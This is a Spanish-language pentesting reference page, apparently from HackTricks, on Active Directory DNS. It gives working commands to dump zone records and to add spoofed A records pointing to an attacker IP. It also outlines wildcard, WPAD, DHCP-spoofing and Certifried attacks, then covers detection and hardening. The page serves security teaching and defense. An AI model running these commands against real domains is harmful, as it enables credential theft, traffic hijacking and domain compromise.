# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

Por defecto, **cualquier usuario** en Active Directory puede **enumerar todos los registros DNS** en las zonas DNS del Dominio o del Bosque, similar a una transferencia de zona (los usuarios pueden listar los objetos secundarios de una zona DNS en un entorno AD).

La herramienta [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) permite la **enumeración** y **exportación** de **todos los registros DNS** en la zona para propósitos de reconocimiento de redes internas.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (abril de 2025) agrega salida JSON/Greppable (`--json`), resolución DNS multihilo y soporte para TLS 1.2/1.3 al enlazarse a LDAPS

Para más información, lee [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Creación / Modificación de registros (suplantación ADIDNS)

Debido a que el grupo **Authenticated Users** tiene **Create Child** en el DACL de la zona por defecto, cualquier cuenta de dominio (o cuenta de computadora) puede registrar registros adicionales. Esto puede ser utilizado para secuestro de tráfico, coerción de relé NTLM o incluso compromiso total del dominio.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py se incluye con Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Primitivas de ataque comunes

1. **Registro comodín** – `*.<zona>` convierte el servidor DNS de AD en un respondedor a nivel empresarial similar al spoofing de LLMNR/NBNS. Puede ser abusado para capturar hashes NTLM o para retransmitirlos a LDAP/SMB.  (Requiere que la búsqueda WINS esté deshabilitada.)
2. **Secuestro de WPAD** – añade `wpad` (o un registro **NS** que apunte a un host atacante para eludir la Lista de Bloqueo de Consultas Globales) y proxy transparente de solicitudes HTTP salientes para cosechar credenciales.  Microsoft parcheó los bypass de comodín/DNAME (CVE-2018-8320) pero **los registros NS aún funcionan**.
3. **Toma de entrada obsoleta** – reclama la dirección IP que anteriormente pertenecía a una estación de trabajo y la entrada DNS asociada seguirá resolviendo, habilitando delegación restringida basada en recursos o ataques de Credenciales Sombrías sin tocar DNS en absoluto.
4. **Spoofing DHCP → DNS** – en una implementación predeterminada de Windows DHCP+DNS, un atacante no autenticado en la misma subred puede sobrescribir cualquier registro A existente (incluidos los Controladores de Dominio) enviando solicitudes DHCP falsificadas que activan actualizaciones dinámicas de DNS (Akamai “DDSpoof”, 2023).  Esto da acceso de máquina en el medio sobre Kerberos/LDAP y puede llevar a la toma completa del dominio.
5. **Certifried (CVE-2022-26923)** – cambia el `dNSHostName` de una cuenta de máquina que controlas, registra un registro A coincidente, luego solicita un certificado para ese nombre para suplantar el DC. Herramientas como **Certipy** o **BloodyAD** automatizan completamente el flujo.

---

## Detección y endurecimiento

* Denegar a **Usuarios Autenticados** el derecho de *Crear todos los objetos secundarios* en zonas sensibles y delegar actualizaciones dinámicas a una cuenta dedicada utilizada por DHCP.
* Si se requieren actualizaciones dinámicas, establece la zona como **Solo segura** y habilita **Protección de Nombres** en DHCP para que solo el objeto de computadora propietario pueda sobrescribir su propio registro.
* Monitorea los IDs de eventos del servidor DNS 257/252 (actualización dinámica), 770 (transferencia de zona) y escrituras LDAP a `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Bloquea nombres peligrosos (`wpad`, `isatap`, `*`) con un registro intencionalmente benigno o a través de la Lista de Bloqueo de Consultas Globales.
* Mantén los servidores DNS actualizados – por ejemplo, los errores RCE CVE-2024-26224 y CVE-2024-26231 alcanzaron **CVSS 9.8** y son explotables de forma remota contra Controladores de Dominio.

## Referencias

* Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, sigue siendo la referencia de facto para ataques de comodín/WPAD)
* Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dic 2023)
{{#include ../../banners/hacktricks-training.md}}
